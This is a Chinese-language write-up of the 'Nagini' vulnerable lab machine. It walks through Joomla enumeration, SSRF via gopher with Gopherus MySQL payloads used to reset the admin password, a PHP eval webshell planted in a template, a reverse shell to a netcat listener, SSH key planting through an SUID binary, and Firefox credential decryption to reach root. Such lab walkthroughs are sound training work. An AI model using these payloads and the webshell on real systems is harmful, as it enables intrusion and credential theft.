# 前言

使用`virtual box`虚拟环境

靶机：`nagini`

攻击：`kali`



# 主机发现

使用`arp-scan -l`扫描，确保在同一网卡

![](./pic-nagini/1.jpg)

# 信息收集

## 使用nmap进行扫描



![](./pic-nagini/2.jpg)





发现80端口`http`服务，`apache 2.4.38`，22端口`ssh`服务，`openssh`

## 网站探测



使用`whatweb`探测

![](./pic-nagini/3.jpg)



使用`gobuster、dirsearch、ffuf、dirb`等工具进行目录扫描

检测到`joomla`可能是CMS，访问查看

![](./pic-nagini/4.jpg)



先访问默认界面，没有任何东西，下载图片也没有隐藏信息

![](./pic-nagini/4-1.jpg)

访问`note.txt`文件，说是使用新的`http3`服务器，给出网址`https://quic.nagini.hogwarts`，通过这个进行进一步的通信，所有开发人员都被要求定期访问服务器以检测最新公告。最后给出来信人`site_admin`。可能存在用户`admin`

![](./pic-nagini/8.jpg)

访问确实是`joomla`的CMS

![](./pic-nagini/5.jpg)

查看页面源码，发现有几个隐藏的输入

![](./pic-nagini/6.jpg)



## CMS针对

针对该CMS，有专门的工具`joomscan`可使用，会检测防火墙等操作

```shell
joomscan -u http://192.168.1.101
```



![](./pic-nagini/7.jpg)



检测具体目录，并进行枚举

```shell
joomscan -u http://192.168.1.101/joomla/ 
```

![](./pic-nagini/7-1.jpg)

![7-2](./pic-nagini/7-2.jpg)



找到两个文件，访问`robots.txt`查看，发现是一些目录

![](./pic-nagini/9.jpg)

再访问备份文件`http://192.168.1.101/joomla/configuration.php.bak`

下载后查看内容

![](./pic-nagini/10.jpg)

![11](./pic-nagini/11.jpg)



## 总结以上信息：

1. 数据库类型为`mysql`
2. 有一个连接数据库的空密码的`user`为`goblin`
3. 数据库名为`joomla`
4. 邮箱地址`site_admin@nagini.hogwarts`
5. 以及一些路径已经给出
6. `note.txt`中提出了`http3` 的连接交流，并且指定域名`https://quic.nagini.hogwarts`

# 漏洞发现

## 配置http3浏览

首先把靶机IP地址与域名进行绑定

```
vim /etc/hosts
```

网上查看`http3`，说是`firefox`和`google`都启用了，但是直接访问的话，还是不行，哪怕到浏览器配置把`http3`启动，还是无法访问



采用网上的方法

```shell
git clone --recursive https://github.com/cloudflare/quiche  
#下载浏览器的数据包
apt-get install cargo	#配置环境
apt-get install cmake	#配置环境

#下载完成后，到目录下
cargo build 	#开始建造
apt-get purge rustc
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
#执行中出现选择，输入1即可
source $HOME/.cargo/env	#环境变量

cargo build --examples
cargo test		#测试有无问题
cd /quiche/target/debug/examples	#切换到创建的环境
./http3-client https://quic.nagini.hogwarts#访问
```



啧啧，结果还是不行，使用无任何返回，看看成功的人，记下路径，直接访问`internalResourceFeTcher.php`

## SSRF漏洞利用

查看页面源码后，以`id=url`接收输入后

![](./pic-nagini/12.jpg)



![](./pic-nagini/13.jpg)



可以看到是`text`的`input`，不知道`php`代码有没有做其他条件，这里直接输入文件测试

## SSRF之文件读取

可以看到`php`有参数接收，可以直接测试`file://`读取文件格式

![](./pic-nagini/14.jpg)

## SSRF之gopher协议

存在`SSRF`漏洞，测试`gopher`协议

![](./pic-nagini/15.jpg)





使用`gopherus`工具创建`SSRF`漏洞的利用。

想起之前的`mysql`连接，使用该工具生成一个`mysql`的`payload`

```shell
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
./gopherus --exploit mysql
```



![](./pic-nagini/16.jpg)



使用这个`payload`多测试几遍，就会出现

![](./pic-nagini/17.jpg)

## SSRF---gopher之数据库

发现数据库中的一个表

![](./pic-nagini/18.jpg)



多次尝试该`payload`，查询到`site_admin`用户

![](./pic-nagini/19.jpg)

密码`$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay`

尝试解密，发现不行，自己生成一个改密码的值，然后进行更新操作

```shell
echo -n "123456" | md5sum
```



使用`gopherus`工具生成，更新信息的命令

![](./pic-nagini/20.jpg)



多次使用`payload`，出现下面后，成功修改

![](./pic-nagini/21.jpg)

## 网站管理登录

访问之前的`joomla/administrator`路径，使用`site_admin`用户和密码`123456`进行登录

![](./pic-nagini/22.jpg)

这个界面就可以操作很多东西，在扩展处，有模板，可以在这里进行设置，这里在站点的默认界面进行插入一句话代码

```php
<?php @eval($_REQUEST['cmd'])?>
```



![](./pic-nagini/23.jpg)





![](./pic-nagini/24.jpg)



## 反弹shell

使用蚁🗡连接即可，当然也可以使用`kali`中的模块`/usr/share/webshells/php/php-reverse-shell.php`

![](./pic-nagini/25.jpg)



整个文件中的代码复制到目标

![](./pic-nagini/26.jpg)



然后在`kali`中使用`nc`监听1234端口，获取成功



![](./pic-nagini/27.jpg)





切换到`/home`目录，看到文本，应该是密码，通过`base64`进行解码

![](./pic-nagini/28.jpg)

![](./pic-nagini/28-1.jpg)

尝试进入`.ssh`目录，查看有无私钥等，发现无权

![](./pic-nagini/29.jpg)



使用`ssh`登录`snape`使用解密出的字符`Love@lilly`进行测试，可以登录，然后使用`find`寻找具有`SUID`权限，发现有一个`/home/hermoine/bin/su_cp`



![](./pic-nagini/30.jpg)

切换到这个目录查看，发现有个`txt`文件，并且无权查看。`su_cp`是一个可执行文件

![](./pic-nagini/31.jpg)



测试，并查看帮助

![](./pic-nagini/32.jpg)

# 提权

## ssh公私钥

因为每个用户目录下都有`.ssh`文件，那么就在`kali`上生成一个`ssh`钥匙对

![](./pic-nagini/33.jpg)





把改名字为正常的已认证的文件`authorized_keys`，为了防止在靶机中权限不行导致改不了名称

虽然这里可以在使用`su_cp`的时候直接修改名称，但是这是一个习惯，还是生成之后再进行

这里可以选择通过`wget`配合`python -m`下载，也可以复制文本内容，然后粘贴（这种方式需要有编辑或创建文件的权限）

然后使用该命令把公钥复制到`.ssh`目录下

![](./pic-nagini/34.jpg)



可以看到把在`kali`中已经生成的公钥作为用户`hermonine`的`ssh`配置中为已认证的，所以使用`kali`指定私钥文件直接连接即可

![](./pic-nagini/35.jpg)



## firefox_decrypt使用

先是使用`find`寻找具有`SUID`的，发现除了那个`su_cp`没有其他可用的了，但是这个也无法复制`/etc/shadow`，所以`hash`破解是不行了，查看当前目录所有文件，看到有一个`.mozilla`文件夹

![](./pic-nagini/36.jpg)



在进入浏览一番，发现在`firefox`目录下有文件和文件夹，并且其中的一个目录中记录用户登录的用户名和密码，但是不知道加密算法，这里先把`.mozilla`目录下载到`kali`中

这里可以使用`scp`命令来上传下载，这里需要注意，这里是`kali`登录靶机可以通过私钥文件直接登录，但是反过来就需要`kali`开启`ssh`服务，有点麻烦，所以这里直接在`kali`上使用`scp`命令



![](./pic-nagini/37.jpg)



![](./pic-nagini/38.jpg)



在本地尝试进行破解其中的加密，找了好久，没有找到加密算法，所以查看搜索一下，发现使用工具`firefox_decrypt`即可。项目地址`https://github.com/unode/firefox_decrypt.git`

![](./pic-nagini/39.jpg)



使用`firefox_decrypt`指定`profiles.ini`所在父目录即可

![](./pic-nagini/40.jpg)

提权到`root`成功



![](./pic-nagini/41.jpg)

# 清除痕迹

![](./pic-nagini/42.jpg)



# 总结

1. 对于`joomla`这个CMS有了初步了解，可以知道网站的构造大概是什么样子
2. SSRF漏洞的利用，利用该漏洞可以访问其靶机内网中的一些文件等操作
3. 对于`http3`有了基本了解，虽然没有搭建成功
4. 对于数据库的增删改查要记住，这样才好使用
5. 对于`webshell`有了基本了解可自己编写一句话或者使用`kali`的内置
6. 对于`ssh`认证过程要有基本的了解，不管是使用密码的形式还是公私钥文件的形式
7. 以及`ssh`配套的`scp`也是经常使用到的，当不能下载的时候，这个命令可以救命
8. 对于工具`firefox_decrypt`的了解
9. 对于`gopher`协议的了解



- Gopher 协议是 Internet 上一个非常早的分布式文件传输协议。它的设计目标是提供一种简单、高效的方式来组织和访问各种类型的文档、文件和其他资源。与 HTTP 协议用于网页浏览类似，Gopher 主要用于文本信息的检索和传输。

- Gopher 采用客户端 - 服务器架构。
- **服务器端**：Gopher 服务器存储了大量的信息资源，这些资源被组织成类似文件系统的层次结构。每个资源都有一个唯一的标识符，称为 Gopher 选择器（Gopher selector）。服务器通过监听特定的端口（通常是 70 端口）来接收客户端的请求。
- **客户端**：Gopher 客户端软件用于向服务器发送请求并接收和处理服务器返回的信息。当用户在客户端选择一个菜单选项时，客户端会根据该选项对应的 Gopher 选择器向服务器发送请求。服务器接收到请求后，会查找相应的资源，并将资源的内容（如文本文件、目录列表等）返回给客户端。客户端收到信息后，会将其呈现给用户，例如在终端屏幕上显示文本内容或者解析目录列表并显示为菜单形式。

随着万维网的发展，Gopher 协议的使用已经大大减少。





























